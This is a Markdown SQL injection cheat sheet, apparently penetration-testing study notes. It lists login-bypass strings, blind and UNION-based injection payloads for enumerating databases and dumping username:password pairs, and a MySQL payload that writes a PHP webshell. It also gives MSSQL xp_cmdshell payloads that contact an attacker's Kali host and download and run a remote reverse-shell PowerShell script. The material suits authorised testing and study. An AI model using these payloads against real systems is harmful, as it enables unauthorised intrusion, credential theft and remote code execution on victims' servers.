## Portswigger Cheatsheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

## Payloads
```
'
)'
"
`
')
")
`)
'))
"))
`))
'-SLEEP(30); #
```
## Login Bypass
Both user and password or specific username and payload as password
```
' or 1=1 --  
' or '1'='1  
' or 1=1 --+  
user' or 1=1;#  
' and 1=1#  
user' or 1=1 LIMIT 1;#
user' or 1=1 LIMIT 0,1;#
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //  
' OR 1=1 in (SELECT * FROM users) -- //
```
If query accepts only one column  
```
' or 1=1 in (SELECT password FROM users) -- //
```
To retrieve specific user password  
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

sql = "select count(user_name) from web_users where user_name='" + username + "' and password='" + userpass + "'";
```
Note : // Comment Indicaated php is used in application

## Boolean Based Blind SQLI :
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

## Time Based Blind SQLI
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
Note : When testing for blind we cant always expect 5xx when statement is wrong. Look if we get results if statement is correct, if statement is wrong we don’t get results.

### Identify Columns
Increment no. till we identify no. of columns
```
' order by 1--
' order by 2-- 
```
use the count of null identified using order bt
```
'union select null--
```
Identify version and others using cheaatsheet
```
'union select @@version,null--
```
Identifying Name of Databases
```
'union SELECT schema_name,null,null,null FROM information_schema.schemata--
```
Identifying Name of Tables present in a particular DB
```
' union SELECT TABLE_NAME,null,null,null FROM information_schema.TABLES WHERE table_schema='Staff'--
```
Identifying Column name of a particular table
```
' union SELECT column_name,null,null,null FROM information_schema.columns WHERE table_name = 'StaffDetails'--
```
Dumping Data
(last dbname.tablename)(else use database name at last its enough)
```
' union SELECT group_concat(Username,":",Password),null,null,null FROM users.UserDetails--
```

### Making it Readable
```
cat userPass | tr "," "\n" (userPass is dumped data file)
cut -d ":" -f1 userPass | tee -a user  
cut -d ":" -f1 userPass | tee -a pass
```

## RCE
#### MYSQL
Note : directory must be writable to OS user
```
' UNION SELECT "<?phpsystem($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
Access File 
```
/tmp/webshell.php?cmd=id
```

#### MSSQL
Activate web server on our kali
```
python3 -m http.server 8080
```
Try to access 
```
';execmaster..xp_cmdshell 'powershell -c Invoke-WebRequest "http://kaliip:8080/p" -Method HEAD'--
```
Got Hit, try to 
```
';exec master..xp_cmdshell 'powershell -enc ajsbJDB'--
```
Reference : 
https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1

Another Method 
```
test';EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.240/rev.ps1") | powershell -noprofile'--
```